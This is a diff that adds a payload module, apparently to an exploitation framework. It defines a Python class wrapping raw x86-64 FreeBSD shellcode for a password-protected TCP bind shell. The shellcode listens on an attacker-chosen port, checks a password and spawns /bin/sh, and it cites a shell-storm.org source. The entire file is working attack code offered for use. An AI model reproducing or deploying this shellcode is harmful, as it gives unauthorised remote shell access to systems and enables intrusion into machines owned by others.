@@ -1,0 +1,29 @@
+from lib.payloads.shellcode import Shellcode 
+
+
+class Payload(Shellcode):
+    Shellcode.info["author"] = "dracyrys"
+    Shellcode.info["name"] = "FreeBSDx64 - tcp_bind shellcode"
+    Shellcode.info["references"] = [
+        "http://shell-storm.org/shellcode/files/shellcode-865.php",
+    ]
+    Shellcode.info["size"] = 127
+
+    def __init__(self, **kwargs): 
+        Shellcode.info["payload"] = [
+            r"\x6a\x61\x58\x6a\x02\x5f\x6a\x01\x5e\x99"
+            r"\x0f\x05\x48\x97\xba\xff\x02"
+            + kwargs["lport"] +
+            r"\x80\xf2\xff\x52\x48\x89\xe6\x99\x04\x66\x80"
+            r"\xc2\x10\x0f\x05\x04\x6a\x0f\x05\x04\x1e"
+            r"\x48\x31\xf6\x99\x0f\x05\x48\x97\x6a\x03"
+            r"\x58\x52\x48\x8d\x74\x24\xf0\x80\xc2\x10"
+            r"\x0f\x05\x48\xb8"
+            + kwargs["password"] +
+            r"\x57\x48\x8d\x3e\x48\xaf\x74\x08"
+            r"\x48\x31\xc0\x48\xff\xc0\x0f\x05\x5f\x48"
+            r"\x89\xd0\x48\x89\xfe\x48\xff\xce\xb0\x5a"
+            r"\x0f\x05\x75\xf7\x99\x04\x3b\x48\xbb\x2f"
+            r"\x62\x69\x6e\x2f\x2f\x73\x68\x52\x53\x54"
+            r"\x5f\x52\x57\x54\x5e\x0f\x05"		
+        ]
